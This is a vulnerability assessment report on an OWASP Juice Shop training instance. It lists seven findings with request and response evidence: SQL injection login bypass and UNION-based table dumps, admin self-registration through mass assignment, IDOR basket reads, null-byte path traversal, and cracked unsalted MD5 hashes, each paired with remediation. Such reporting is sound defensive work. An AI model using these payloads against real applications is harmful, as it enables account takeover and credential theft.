# Vulnerability Assessment — OWASP Juice Shop @ `http://172.17.0.2:3000`

## Executive Summary

An authorized, non-destructive assessment of the target Juice Shop instance found seven confirmed issues, three of which independently yield full administrative compromise. The application is trivially exploitable via SQL injection (both an authentication bypass and a full credential-table dump), permits anonymous self-escalation to `admin` via mass assignment on registration, and exposes other users' data via a broken object-level authorization check. All findings were reproduced live against the target with the request/response evidence shown below.

| # | Finding | Severity | CWE |
|---|---------|----------|-----|
| 1 | SQL injection → authentication bypass in `POST /rest/user/login` | Critical | CWE-89 |
| 2 | UNION-based SQL injection → full credential exfiltration in `GET /rest/products/search` | Critical | CWE-89 |
| 3 | Mass assignment → anonymous privilege escalation to admin in `POST /api/Users` | Critical | CWE-915 |
| 4 | IDOR / BOLA — cross-user basket read in `GET /rest/basket/{id}` | High | CWE-639 |
| 5 | Path traversal via Poison Null Byte in `GET /ftp/...` | High | CWE-22 |
| 6 | Weak password storage (unsalted MD5) | Medium | CWE-916 |
| 7 | Verbose SQL error / information disclosure in `GET /rest/products/search` | Low | CWE-209 |

---

### 1. SQL injection in `POST /rest/user/login` allows credential-less admin authentication

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **Affected asset:** `POST http://172.17.0.2:3000/rest/user/login`, JSON field `email`
- **Summary:** The login email is concatenated into a SQL query, so an attacker can log in as any user — including the administrator — without knowing a password. This is a complete account takeover of every account on the platform.
- **Steps to Reproduce:**
  1. Send:
     ```
     POST /rest/user/login HTTP/1.1
     Host: 172.17.0.2:3000
     Content-Type: application/json

     {"email":"' OR 1=1--","password":"x"}
     ```
  2. Observed response — a valid signed JWT is returned:
     ```
     {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjox...
     ```
  3. Decoding the JWT payload confirms admin identity:
     ```
     {"data":{"id":1,"username":"","email":"admin@juice-sh.op","role":"admin","isActive":true,...}}
     ```
- **Impact:** Full administrative account takeover with no credentials. The `OR 1=1` predicate matches the first row (`id:1`), which is the admin. An attacker gains an admin-scoped session token immediately.
- **Remediation:** Use parameterized queries / ORM bind parameters for the login lookup; never interpolate the `email` value into raw SQL.
- **References:** https://cwe.mitre.org/data/definitions/89.html · OWASP A03:2021 – Injection

---

### 2. UNION-based SQL injection in `GET /rest/products/search` allows full credential exfiltration

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)
- **CWE:** CWE-89 (SQL Injection)
- **Affected asset:** `GET http://172.17.0.2:3000/rest/products/search?q=`
- **Summary:** The product-search `q` parameter is injectable in an unquoted string context, letting an unauthenticated attacker append a `UNION SELECT` and read arbitrary database tables — including every user's email and password hash.
- **Steps to Reproduce:**
  1. Confirm injectability (error probe): `GET /rest/products/search?q=test'` returns `Error: SQLITE_ERROR: near "'%'": syntax error`.
  2. Dump the user table:
     ```
     GET /rest/products/search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--
     ```
  3. Observed response contained every user's email and password hash, e.g.:
     ```
     admin@juice-sh.op            | 0192023a7bbd73250516f069df18b500
     jim@juice-sh.op              | e541ca7ecf72b8d1286474fc613e5e45
     bender@juice-sh.op           | 0c36e517e3fa95aabf1bbffc6744a4ef
     bjoern.kimminich@gmail.com   | 6edd9d726cbdc873c539e41ae8757b8c
     ciso@juice-sh.op             | 861917d5fa5f1172f931dc700d81a8fb
     support@juice-sh.op          | 3869433d74e3d0c86fd25562f836bc82
     ```
  4. A filtered variant (`... WHERE role='admin'--`) additionally enumerated hidden/privileged accounts: `wurstbrot@juice-sh.op`, `cloud-admin@juice-sh.op`, `J12934@juice-sh.op`.
- **Impact:** Complete database read. All account credentials are exfiltrated. Combined with Finding #6, the hashes crack trivially (admin hash `0192023a7bbd73250516f069df18b500` = MD5 of `admin123`), enabling credential reuse against this and other services.
- **Remediation:** Parameterize the search query / use the ORM's bound-parameter API; reject or escape the `q` value rather than concatenating it into SQL.
- **References:** https://cwe.mitre.org/data/definitions/89.html · OWASP A03:2021 – Injection

---

### 3. Mass assignment in `POST /api/Users` allows anonymous self-escalation to admin

- **Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8)
- **CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes / Mass Assignment)
- **Affected asset:** `POST http://172.17.0.2:3000/api/Users`, JSON field `role`
- **Summary:** The registration endpoint blindly persists client-supplied fields, so an anonymous user can register an account with `role: "admin"` and become an administrator instantly.
- **Steps to Reproduce:**
  1. Send a registration request with an extra `role` field:
     ```
     POST /api/Users HTTP/1.1
     Host: 172.17.0.2:3000
     Content-Type: application/json

     {"email":"pwn1937@x.io","password":"Passw0rd!","role":"admin"}
     ```
  2. Observed response — the server persisted `role:"admin"` (account id 25):
     ```
     {"status":"success","data":{"id":25,"email":"pwn1937@x.io","role":"admin","isActive":true,...}}
     ```
- **Impact:** Any unauthenticated visitor can create a fully privileged admin account, an alternative path to complete platform compromise that does not require exploiting the SQL injection.
- **Remediation:** Apply a server-side allowlist of writable fields on registration; force `role` to the default customer value and ignore any client-supplied privilege attributes.
- **References:** https://cwe.mitre.org/data/definitions/915.html · OWASP A08:2021 – Software and Data Integrity Failures / API6:2023 – Mass Assignment

---

### 4. IDOR / BOLA in `GET /rest/basket/{id}` allows reading other users' baskets

- **Severity:** High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (6.5)
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Affected asset:** `GET http://172.17.0.2:3000/rest/basket/{id}`
- **Summary:** The basket endpoint returns any basket by ID without verifying it belongs to the requesting user, exposing other customers' cart contents.
- **Steps to Reproduce:**
  1. Authenticate as user id 1 (token from Finding #1). Request your own basket `GET /rest/basket/1` → returns basket with `"UserId":1`.
  2. Request another user's basket:
     ```
     GET /rest/basket/2
     Authorization: Bearer <token for UserId 1>
     ```
  3. Observed response returned UserId 2's data:
     ```
     {"status":"success","data":{"id":2,"UserId":2,"Products":[{"id":4,"name":"Raspberry Juice (1000ml)",...}]}}
     ```
- **Impact:** Any authenticated user can enumerate and read arbitrary baskets by incrementing the ID, disclosing other customers' shopping data. Same missing ownership check typically enables cross-user modification.
- **Remediation:** Enforce an ownership check on every basket access — verify `basket.UserId === session.userId` before returning or modifying the resource.
- **References:** https://cwe.mitre.org/data/definitions/639.html · OWASP A01:2021 – Broken Access Control / API1:2023 – BOLA

---

### 5. Path traversal via Poison Null Byte in `GET /ftp/...` allows retrieval of restricted files

- **Severity:** High — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **Affected asset:** `GET http://172.17.0.2:3000/ftp/<file>`
- **Summary:** The `/ftp` file server enforces an extension allowlist, but a null-byte (`%00`) injected before an allowed extension bypasses the filter and serves otherwise-blocked files (source, `.bak`, config).
- **Steps to Reproduce:**
  1. Confirm the filter blocks a disallowed extension: `GET /ftp/coupons_2013.md.bak` → `HTTP/1.1 403`.
  2. Bypass it with an encoded null byte and an allowed suffix:
     ```
     GET /ftp/package.json.bak%2500.md
     ```
  3. Observed response: `HTTP/1.1 200` — the `.bak` file is served, defeating the `.md`/`.pdf` allowlist.
  4. `/ftp` is discoverable via `robots.txt` (`Disallow: /ftp`).
- **Impact:** Unauthenticated retrieval of files intended to be restricted (backups, source, configuration), which can leak secrets and further application internals.
- **Remediation:** Reject any request containing a null byte (`%00`/`\0`); canonicalize and decode the path fully, then validate the real, final extension against the allowlist before serving.
- **References:** https://cwe.mitre.org/data/definitions/22.html · OWASP A01:2021 – Broken Access Control

---

### 6. Weak password storage — unsalted MD5 hashes

- **Severity:** Medium — CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (5.9)
- **CWE:** CWE-916 (Use of Password Hash With Insufficient Computational Effort)
- **Affected asset:** `Users.password` storage (observed via Finding #2)
- **Summary:** User passwords are stored as unsalted MD5, which is instantly crackable with rainbow tables — turning any database read into plaintext credential compromise.
- **Steps to Reproduce:**
  1. Using the dump from Finding #2, take the admin hash `0192023a7bbd73250516f069df18b500`.
  2. This is the well-known MD5 of `admin123` (recovers via any rainbow-table lookup), confirming unsalted MD5 and a weak default credential.
- **Impact:** Amplifies Finding #2 — exfiltrated hashes convert directly to plaintext passwords, enabling credential reuse against this and other services. The presence of a weak default admin password (`admin123`) makes reuse trivial.
- **Remediation:** Migrate password storage to a memory-hard adaptive hash (bcrypt/scrypt/argon2) with per-user salts; force a reset of existing credentials and rotate the default admin password.
- **References:** https://cwe.mitre.org/data/definitions/916.html · OWASP A02:2021 – Cryptographic Failures

---

### 7. Verbose SQL errors in `GET /rest/products/search` disclose backend details

- **Severity:** Low — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3)
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Affected asset:** `GET http://172.17.0.2:3000/rest/products/search?q=`
- **Summary:** A malformed query returns the raw database error and a stack-trace page, leaking the backend engine and query structure. Largely subsumed by Finding #2 but reported for completeness.
- **Steps to Reproduce:**
  1. `GET /rest/products/search?q=test'`
  2. Observed response: an HTML error page titled `Error: SQLITE_ERROR: near "'%'": syntax error`, revealing the SQLite backend and confirming the injection context.
- **Impact:** Reduces attacker effort by disclosing the database type and query internals, accelerating exploitation of Findings #1/#2.
- **Remediation:** Return generic `500` responses in production; disable stack traces and detailed DB error propagation to clients.
- **References:** https://cwe.mitre.org/data/definitions/209.html · OWASP A05:2021 – Security Misconfiguration

---

### Additional observations (not scored)
- `GET /rest/admin/application-configuration` is world-readable and returns application config; worth a follow-up review for embedded secrets.
- **Test cleanup:** one throwaway account was created to prove Finding #3 — please delete `pwn1937@x.io` (id 25).

### Coordinated Disclosure
This assessment was authorized and conducted non-destructively against the designated instance (`172.17.0.2`, <8 req/s). Please treat these findings as confidential: no public disclosure prior to a fix, under a standard 90-day disclosure window. I'm happy to re-test once remediations land.